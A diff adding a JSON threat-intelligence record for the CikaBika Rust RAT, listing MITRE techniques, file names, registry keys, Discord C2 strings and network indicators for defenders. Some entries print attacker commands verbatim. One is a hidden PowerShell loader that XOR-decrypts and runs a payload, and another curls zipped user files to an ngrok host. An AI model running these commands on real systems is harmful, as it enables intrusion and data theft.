@@ -1,0 +1,551 @@
+{
+  "malware_family": "CikaBika",
+  "threat_actor": "",
+  "platforms": [
+    "windows",
+    "linux"
+  ],
+  "summary": "CikaBika is a Rust-based RAT delivered through a disk image containing a decoy PDF and a double-extension LNK that drops a Nim loader, which uses an ms-settings UAC bypass to plant a sideloaded dbghelp.dll in Microsoft Edge. The RAT registers each victim with Discord for C2, exposes an operator command set (!shell, !download, !sysinfo), and exfiltrates staged archives via ngrok. The same report also covers XMRig cryptomining on a compromised AWS Bedrock AI gateway and WebDAV/Discord-linked infrastructure from AI-assisted campaigns.",
+  "mitre_techniques": [
+    "T1204.002",
+    "T1036.007",
+    "T1059.001",
+    "T1027",
+    "T1140",
+    "T1548.002",
+    "T1112",
+    "T1574.001",
+    "T1036.005",
+    "T1082",
+    "T1016",
+    "T1057",
+    "T1113",
+    "T1059.003",
+    "T1102.002",
+    "T1560.001",
+    "T1567",
+    "T1070.004",
+    "T1218.010",
+    "T1005",
+    "T1074.001",
+    "T1041",
+    "T1564.003",
+    "T1027.013",
+    "T1133",
+    "T1078",
+    "T1059",
+    "T1136",
+    "T1526",
+    "T1496"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "file_name",
+      "value": "Proposition_Projet.img",
+      "context": "Disk image delivering the LNK lure and decoy PDF",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Presentation_Generale.pdf.pdf",
+      "context": "Decoy PDF opened while PowerShell runs hidden",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Proposition_Projet_Personnalisable.docx.lnk",
+      "context": "LNK disguised as Word document inside the image",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "-WindowStyle Hidden Start-Process 'Presentation_Generale.pdf.pdf' -WindowStyle Minimized;$data=[IO.File]::ReadAllBytes('Presentation_Generale.pdf.pdf');$key=$data[239];$file=$env:TEMP+'\\IfyuUapz.txt';$xdata = ($data[144305..5726256] | ForEach-Object { $_ -bxor $key });[IO.File]::WriteAllBytes($file, $xdata);cmd /c $file",
+      "context": "PowerShell embedded in malicious LNK; parent is the LNK/explorer, runs hidden",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "$data[239] (0x20) single-byte XOR key; payload slice $data[144305..5726256]",
+      "context": "XOR key byte and ciphertext offsets from the decoy PDF",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\IfyuUapz.txt",
+      "context": "XOR-decrypted Nim loader written and run with cmd /c",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "IfyuUapz.txt",
+      "context": "Nim loader holding base64 Rust DLL and PowerShell deployer",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "dllFile",
+      "context": "Loader-internal reference name for the decoded DLL blob",
+      "specificity": "medium",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "copyPs1",
+      "context": "Loader-internal reference name for the decoded PowerShell blob",
+      "specificity": "medium",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\dbghelp.dll",
+      "context": "Sideload destination for malicious dbghelp.dll",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\dbghelp.tmp",
+      "context": "Staging copy before UAC-bypass move into Edge directory",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
+      "context": "Modified so computerdefaults.exe moves the staged DLL (UAC bypass)",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "computerdefaults.exe",
+      "context": "Launched to trigger hijacked ms-settings command",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "regsvr32.exe",
+      "context": "Fallback DLL load when Nim loadLib fails",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "msedge.exe",
+      "context": "Legitimate host with delay-loaded dbghelp.dll dependency",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "dbghelp.dll",
+      "context": "Malicious DLL masquerading as Microsoft debug library in Edge",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "ApplicationFrameHost",
+      "context": "Window hidden by C# helper calling ShowWindow",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "MTQzMjcyMjA4Mzk5NzAyODUxMg.GJpNS2.CE19P",
+      "context": "Hardcoded Discord bot token in the Rust RAT",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "1440633973104705547",
+      "context": "Discord ID stored alongside the RAT's API path",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Available commands: !shell, !src, !info, !download, !upload, !sysinfo, !stream, !camera, !broadcast, !isOn",
+      "context": "Command menu the RAT posts in the victim's Discord channel",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "جهاز جديد تم تسجيله بنجاح",
+      "context": "Arabic Discord device-registration message emitted by the RAT",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Device is ready for manual commands",
+      "context": "RAT message announcing interactive command readiness",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Device ID: e9fc8fb4 | Device Management System",
+      "context": "Footer of the RAT's Discord registration embed",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "network_info.txt",
+      "context": "ipconfig output uploaded to the Discord channel",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "tasklist_startup.txt",
+      "context": "tasklist output collected at RAT startup",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "screenshot.png",
+      "context": "Screenshot captured during RAT reconnaissance",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "tasklist",
+      "context": "Run by the RAT for process enumeration",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "ipconfig",
+      "context": "Run by the RAT for network configuration discovery",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell -Command \"Compress-Archive -Path 'C:\\Users\\[REDACTED]' -DestinationPath 'C:\\Users\\[REDACTED]' -Force\" && curl -X POST \"https://0487-105-96-75-236.ngrok-free.app/upload?filename=jdid1.zip\" -H \"Content-Type: application/octet-stream\" --data-binary \"@C:\\Users\\[REDACTED]ES .zip\"",
+      "context": "Operator !shell command archiving data and exfiltrating ZIP via ngrok",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "!download",
+      "context": "Operator command retrieving files from the target over Discord",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "LiteLLM-Proxy",
+      "context": "AWS EC2 instance name of the compromised AI gateway",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "GetSendQuota",
+      "context": "AWS SES API event by suspicious IAM user using AWS CLI",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "InvokeModel",
+      "context": "Failed Bedrock model invocation attempt by same IAM user",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "ListFoundationModels",
+      "context": "Failed Bedrock model enumeration attempt by IAM user",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "CreateUser",
+      "context": "Attempted AWS user creation with low-meaning username (persistence)",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "url",
+      "value": "https://discord.com/api/v10/channels/",
+      "context": "Discord API base used by the RAT for C2",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "discord.com",
+      "context": "Legitimate service abused as C2 channel",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "ipify.com",
+      "context": "Queried during registration to obtain the victim's public IP",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://0487-105-96-75-236.ngrok-free.app/upload?filename=jdid1.zip",
+      "context": "ngrok endpoint receiving exfiltrated jdid1.zip archive",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "pool.hasvault.pro",
+      "context": "Monero mining pool contacted over HTTPS/443 by the AI gateway",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.62.1.8",
+      "context": "Hosts ZIP containing XMRig malware downloaded over port 80",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "145.241.123.102",
+      "context": "Predominant external source of inbound SSH brute-force attempts",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "14.176.1.47",
+      "context": "Vietnam-geolocated source IP of unusual AWS CLI/IAM activity",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "onedrive.cv",
+      "context": "WebDAV host serving CURP-themed masqueraded .scr payload",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "138.124.123.87",
+      "context": "Possible C2 server for onedrive.cv WebDAV delivery",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://onedrive.cv/Downloads/CURP/ReportFinal.%E2%80%AE%E1%BA%9D%D4%81%EF%BD%90.scr",
+      "context": "Masqueraded .scr payload retrieved over WebDAV",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "google.services.ug",
+      "context": "Likely C2 reached over unusual high ports",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "77.110.127.205",
+      "context": "Likely C2 server for google.services.ug",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "google.services.ug:57666",
+      "context": "Likely C2 communication on unusual high port",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "google.services.ug:57888",
+      "context": "Likely C2 communication on unusual high port",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "google.services.ug:56001",
+      "context": "Likely C2 communication on unusual high port",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "192.229.115.229",
+      "context": "Likely C2 beaconed on port 8083; linked to TencShell/Gshell activity",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "192.229.115.230",
+      "context": "Infrastructure associated with suspected TencShell operations",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "85de36ff66fae9f4b059cbedf6d36e017ebc26c828f99f911a96e78636f21200",
+      "description": "ZIP archive containing XMRig crypto-mining malware downloaded by the compromised AI gateway (referenced via VirusTotal)"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script",
+    "archive",
+    "unknown"
+  ]
+}
